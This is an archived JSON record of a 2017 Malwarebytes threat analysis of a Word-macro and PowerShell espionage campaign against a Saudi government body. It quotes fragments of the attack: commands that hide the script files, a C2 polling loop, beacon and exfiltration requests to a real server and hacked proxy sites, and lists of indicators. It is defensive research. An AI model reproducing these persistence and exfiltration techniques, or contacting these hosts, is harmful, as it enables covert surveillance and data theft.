{
    "id": "59191215-7139-49c8-8728-d297e1127128",
    "created_at": "2023-01-12T15:04:59.50788Z",
    "updated_at": "2025-03-27T02:06:12.60965Z",
    "deleted_at": null,
    "sha1_hash": "30633844d3a12c6271e9995ca33adfc43c83bae9",
    "title": "2017-09-26 - Elaborate scripting-fu used in espionage attack against Saudi Arabia Government entity",
    "authors": "",
    "file_creation_date": "2022-05-28T04:56:54Z",
    "file_modification_date": "2022-05-28T04:56:54Z",
    "file_size": 708484,
    "plain_text": "# Elaborate scripting-fu used in espionage attack against Saudi Arabia Government entity\n\n**blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-**\ngovernment_entity/\n\nMalwarebytes Labs September 27, 2017\n\nWe recently came across a campaign targeting a Saudi Arabia Government entity via a\nmalicious Word document which at first reminded us of an attack we had previously\ndescribed on this blog.\n\nIn our [previous research, we detailed how an information stealer Trojan was deployed via a](https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/)\nWord macro, in order to spy on its victims (various parts of the Saudi Government). The\nstolen information was transmitted back to the threat actors’ infrastructure in an encrypted\nformat.\n\nThis new threat also uses a macro to infect the target’s computer, but rather than retrieving a\nbinary payload, it relies on various scripts to maintain its presence and to communicate via\nhacked websites, acting as proxies for the command and control server.\n\nThe malicious script fingerprints the victim’s machine and can receive any command that will\nrun via PowerShell. In this blog post, we will describe the way this threat enters the system\nand maintains its presence while constantly communicating with its command and control\nserver.\n\n\n-----\n\n## Covert delivery and persistence\n\nThe decoy document bears the logo of one of the branches of the Saudi Government and\nprompts the user to “Enable Content” stating that the document is in protected view (which is\nactually true).\n\nA high-level summary static analysis of this document reveals that it includes a macro as well\nas several Base64 encoded strings.\n```\nOLE:MAS--B-- target.doc\n(Flags: M=Macros, A=Auto-executable, S=Suspicious keywords, B=Base64 strings)\n\n```\n\n-----\n\nOne of the first routines the malicious VBScript performs is to disable or lower security\nsettings within Microsoft Excel and Word by altering corresponding registry keys with values\n[of “1”, meaning: Enable All (ref).](https://blogs.technet.microsoft.com/diana_tudor/2014/12/02/microsoft-project-how-to-control-macro-settings-using-registry-keys/)\n\n\n-----\n\nThe VBScript also fingerprints the victim for their IP address by querying the\n[Win32_NetworkAdapterConfiguration class:](https://msdn.microsoft.com/en-us/library/aa394217(v=vs.85).aspx)\n\nIt then proceeds to retrieve a stream of data from the Pastebin website using its own proxy:\n\nThe data is converted into two scripts, a PowerShell and a Visual Basic one, the latter being\nused for persistence on the infected machine via two different hook points: a Run key in the\nregistry and a scheduled task.\n\n\n-----\n\nThis VBScript is really a launcher for the more important PowerShell script, and both are\nstored as hidden system files under the Documents folder using the following commands:\n```\nattrib +s +h \"C:\\Users\\public\\documents\\NTSTATS.ps1\"\nattrib +s +h \"C:\\Users\\public\\documents\\NTSTATS.vbs\"\n\n## Espionage and exfiltration\n\n```\nThat PowerShell script also has the same instructions to lower Office’s security settings but\nmore importantly is used to exfiltrate data and communicate with the command and control\nserver.\n\n\n-----\n\nA unique ID is stored on the victim’s machine (in the same folder as the scripts) in a file\ncalled [username].key and is used to receive instructions via a server located in Germany\n(although it appears to be down at the time of writing).\n```\nGET http://144.76.109[.]88/al/?action=getCommand&id=[user ID] HTTP/1.1\n\n```\nA function called getKey retrieves the unique ID from the .key file stored on the local hard\ndrive to register the machine as a new victim. If the key file does not exist, it queries for\nadditional system information (computer name, IP address, OS version) and then creates\nthat key (Set-Content $keypath $id).\n\n\n-----\n\nAnother function called getCommand uses the key as a parameter to then contact the C2.\nThis command runs every 5 minutes:\n```\nwhile ($true){\n getCommand $key\n start-sleep -Seconds 300\n}\n\n```\nThe malicious script can receive and run any command the attackers want via PowerShell,\nmaking this a very powerful attack.\n\nThe eventual exfiltration of data is done via several hardcoded websites acting as a proxy via\nthe sendResult function:\n\n\n-----\n\nThe transmission of data is done via Base64 encoded strings, one for the user id (.key file)\nand one for the exfiltrated data.\n```\nGET /wp-content/wp_fast_cache/wmg-global.com/Senditem.php?c=[removed]== HTTP/1.1\nHost: www.wmg-global.com\nConnection: Keep-Alive\n\n```\nThe parameters passed on the URL in the Base64 format:\n```\naction=saveResult&id=[removed]&cmd=2&chunk=last&res=[removed]=\n\n```\nDecoding the value in the variable “res”, we get the following info.\n\n\n-----\n\n```\nConnection specific DNS Suffix . : [removed]\nDescription . . . . . . . . . . . : [removed]\nPhysical Address. . . . . . . . . : [removed]\nDHCP Enabled. . . . . . . . . . . : [removed]\nAutoconfiguration Enabled . . . . : [removed]\n\n## Script based attack and protection\n\n```\nThis attack is very different from the typical malicious spam we see on a daily basis, blasting\nLocky or some banking Trojan. Indeed, there is no malicious binary payload (although one\ncould be downloaded by the C2) which makes us think the attackers are trying to keep a low\nprofile and remain on the system while collecting information from their target.\n\nRelying on scripts as part of the attack chain and ongoing infection is an interesting concept\ndue to how modular it is, not to mention more likely to stay undetected from antivirus\nengines. At the same time, it needs to rely on various encoding techniques because it can’t\nmake use of a packer like a traditional malware binary would.\n\n[Malwarebytes users are already protected against this attack thanks to our signature-less](https://www.malwarebytes.com/?utm_source=blog&utm_medium=social)\nengine.\n\n\n-----\n\n## Indicators of compromise\n\nScripts:\n```\nC:\\Users\\public\\documents\\NTSTATS.ps1\nC:\\Users\\public\\documents\\NTSTATS.vbs\n\n```\nC2:\n```\n144.76.109[.]88/al/\n\n```\nProxies:\n```\nlarsson-elevator[.]com/plugins/xmap/com_k2/com.php?c=\nspearhead-training[.]com/action/point2.php?c=\nitcdubai[.]net/action/contact_gtc.php?c=\ntaxconsultantsdubai[.]ae/wp-content/themes/config.php?c=\nprojac.co[.]uk/Senditem.php?c=\nwmg-global[.]com/wp-content/wp_fast_cache/wmg-global.com/Senditem.php?c= \nromix-group[.]com/modules/mod_wrapper/Senditem.php?c=\nheartmade[.]ae/plugins/content/contact/Senditem.php?c=\narch-tech[.]net/components/com_layer_slider/Senditem.php?c=\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-09-26 - Elaborate scripting-fu used in espionage attack against Saudi Arabia Government entity.pdf"
    ],
    "report_names": [
        "2017-09-26 - Elaborate scripting-fu used in espionage attack against Saudi Arabia Government entity.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535899,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1653713814,
    "ts_modification_date": 1653713814,
    "files": {
        "pdf": "https://archive.orkl.eu/30633844d3a12c6271e9995ca33adfc43c83bae9.pdf",
        "text": "https://archive.orkl.eu/30633844d3a12c6271e9995ca33adfc43c83bae9.txt",
        "img": "https://archive.orkl.eu/30633844d3a12c6271e9995ca33adfc43c83bae9.jpg"
    }
}